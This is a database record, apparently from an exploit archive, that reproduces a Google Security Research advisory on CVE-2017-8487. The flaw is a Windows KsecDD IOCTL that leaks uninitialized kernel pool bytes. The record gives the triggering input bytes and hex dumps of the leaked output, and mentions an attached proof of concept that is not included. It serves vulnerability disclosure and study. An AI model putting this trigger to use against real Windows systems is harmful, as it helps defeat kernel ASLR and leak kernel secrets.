{
    "text": "published_time: 2017-06-21 ， id: 35585 ， eid: 42211 ， cve: CVE-2017-8487 ， title: Microsoft Windows - 'IOCTL 0x390400, operation code 0x00020000' Kernel KsecDD Pool Memory Disclosure - Windows dos Exploit ， author: Google Security Research ， published_time: 2017-06-21 ， verified: Verified ， platform: Windows ， exploit_type: dos ， exploit_url: /download/42211 ， exploit_detail: /*\r ， Source: \r ， We have discovered that the IOCTL sent to the \\Device\\KsecDD device by the BCryptOpenAlgorithmProvider documented API returns some uninitialized pool memory in the output buffer. Let's consider the following input data for the IOCTL:\r ， --- cut ---\r ， 00000000: 4d 3c 2b 1a 00 00 02 00 ff ff ff ff 00 00 00 00 M<+.............\r ， 00000010: 20 00 00 00 ff ff ff ff 01 00 00 00 02 00 00 00  ...............\r ， 00000020: 33 00 44 00 45 00 53 00 00 00                   3.D.E.S...\r ， --- cut ---\r ， On our test Windows 7 32-bit workstation, the layout of the output buffer is as follows:\r ， --- cut ---\r ， 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r ， 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r ， 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r ， 00000030: 00 00 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 ................\r ， 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r ， 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r ， 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff ff ................\r ， 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r ， 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r ， 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r ， 000000a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r ， 000000b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\r ， 000000c0: 00 00 00 00 00 00 00 00 00 00 ff ff ?? ?? ?? ?? ................\r ， --- cut ---\r ， Where 00 denote bytes which are properly initialized, while ff indicate uninitialized values copied back to user-mode. As shown above, there are 2 leaked bytes at offsets 0x32-0x33, 2 leaked bytes at offsets 0x6e-0x6f, and 2 leaked bytes at offsets 0xca-0xcb, for a total of 6 disclosed bytes.\r ， The issue can be reproduced by running the attached proof-of-concept program on a system with the Special Pools mechanism enabled for ntoskrnl.exe. Then, it is clearly visible that bytes at the aforementioned offsets are equal to the markers inserted by Special Pools, and would otherwise contain leftover data that was previously stored in that memory region:\r ， --- cut ---\r ， 00000000: 01 00 00 00 08 00 00 00 0c 00 00 00 01 00 00 00 ................\r ， 00000010: 28 00 00 00 34 00 00 00 01 00 00 00 70 00 00 00 (...4.......p...\r ， 00000020: 98 00 00 00 ff ff ff ff 33 00 44 00 45 00 53 00 ........3.D.E.S.\r ， 00000030: 00 00[27 27]4d 00 69 00 63 00 72 00 6f 00 73 00 ..''M.i.c.r.o.s.\r ， 00000040: 6f 00 66 00 74 00 20 00 50 00 72 00 69 00 6d 00 o.f.t. .P.r.i.m.\r ， 00000050: 69 00 74 00 69 00 76 00 65 00 20 00 50 00 72 00 i.t.i.v.e. .P.r.\r ， 00000060: 6f 00 76 00 69 00 64 00 65 00 72 00 00 00[27 27]o.v.i.d.e.r...''\r ， 00000070: 74 00 00 00 80 00 00 00 04 00 00 00 94 00 00 00 t...............\r ， 00000080: 4b 00 65 00 79 00 4c 00 65 00 6e 00 67 00 74 00 K.e.y.L.e.n.g.t.\r ， 00000090: 68 00 00 00 80 00 00 00 a0 00 00 00 01 00 00 00 h...............\r ， 000000a0: 62 00 63 00 72 00 79 00 70 00 74 00 70 00 72 00 b.c.r.y.p.t.p.r.\r ， 000000b0: 69 00 6d 00 69 00 74 00 69 00 76 00 65 00 73 00 i.m.i.t.i.v.e.s.\r ， 000000c0: 2e 00 64 00 6c 00 6c 00 00 00[27 27]?? ?? ?? ?? ..d.l.l...''....\r ， --- cut ---\r ， 00000000: 01 00 00 00 08 00 00 00 0c 00 00 00 01 00 00 00 ................\r ， 00000010: 28 00 00 00 34 00 00 00 01 00 00 00 70 00 00 00 (...4.......p...\r ， 00000020: 98 00 00 00 ff ff ff ff 33 00 44 00 45 00 53 00 ........3.D.E.S.\r ， 00000030: 00 00[85 85]4d 00 69 00 63 00 72 00 6f 00 73 00 ....M.i.c.r.o.s.\r ， 00000040: 6f 00 66 00 74 00 20 00 50 00 72 00 69 00 6d 00 o.f.t. .P.r.i.m.\r ， 00000050: 69 00 74 00 69 00 76 00 65 00 20 00 50 00 72 00 i.t.i.v.e. .P.r.\r ， 00000060: 6f 00 76 00 69 00 64 00 65 00 72 00 00 00[85 85]o.v.i.d.e.r.....\r ， 00000070: 74 00 00 00 80 00 00 00 04 00 00 00 94 00 00 00 t...............\r ， 00000080: 4b 00 65 00 79 00 4c 00 65 00 6e 00 67 00 74 00 K.e.y.L.e.n.g.t.\r ， 00000090: 68 00 00 00 80 00 00 00 a0 00 00 00 01 00 00 00 h...............\r ， 000000a0: 62 00 63 00 72 00 79 00 70 00 74 00 70 00 72 00 b.c.r.y.p.t.p.r.\r ， 000000b0: 69 00 6d 00 69 00 74 00 69 00 76 00 65 00 73 00 i.m.i.t.i.v.e.s.\r ， 000000c0: 2e 00 64 00 6c 00 6c 00 00 00[85 85]?? ?? ?? ?? ..d.l.l.........\r ， --- cut ---\r ， Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.\r ， */"
}